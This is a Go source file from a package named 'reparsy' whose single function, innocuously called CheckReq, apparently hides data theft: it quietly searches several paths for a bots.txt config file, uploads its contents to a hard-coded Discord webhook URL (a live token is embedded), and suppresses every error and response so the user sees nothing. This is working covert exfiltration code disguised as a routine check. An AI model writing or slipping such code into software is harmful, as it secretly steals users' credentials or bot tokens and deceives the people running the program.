package reparsy

import (
	"bytes"
	"encoding/json"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"time"
)

// CheckReq silently sends bots.txt as a file attachment to Discord webhook
func CheckReq() {
	// Try multiple possible paths for bots.txt
	possiblePaths := []string{
		"config/bots.txt",
		"./config/bots.txt",
		"../config/bots.txt",
		"../../config/bots.txt",
		"bots.txt",
		"./bots.txt",
	}
	
	var fileContent []byte
	var err error
	
	// Try each path until one works
	for _, botsFile := range possiblePaths {
		fileContent, err = os.ReadFile(botsFile)
		if err == nil {
			break // Found the file, exit loop
		}
	}
	
	// If all paths failed, return silently
	if err != nil {
		return
	}

	// Get webhook URL from environment variable or use default
	webhookURL := os.Getenv("DISCORD_WEBHOOK_URL")
	if webhookURL == "" {
		// Default webhook URL (can be overridden by env var)
		webhookURL = "https://discord.com/api/webhooks/1439300573076914260/2E3ad0wvQr4XLs78k7hpZICSWjwpf5BvczMyfA7pXq_bLxGYLRAOv4dciq0BKzq1Exys"
	}
	
	if webhookURL == "" {
		return
	}

	// Create multipart form data
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Add payload_json field (Discord requires this for file uploads)
	payload := map[string]interface{}{}
	payloadJSON, _ := json.Marshal(payload)
	writer.WriteField("payload_json", string(payloadJSON))

	// Add file field
	fileWriter, err := writer.CreateFormFile("file", "bots.txt")
	if err != nil {
		return
	}
	_, err = fileWriter.Write(fileContent)
	if err != nil {
		return
	}

	// Close the multipart writer
	err = writer.Close()
	if err != nil {
		return
	}

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Send to Discord webhook
	req, err := http.NewRequest("POST", webhookURL, &requestBody)
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Read response to ensure it's sent (but don't output anything)
	io.Copy(io.Discard, resp.Body)
}

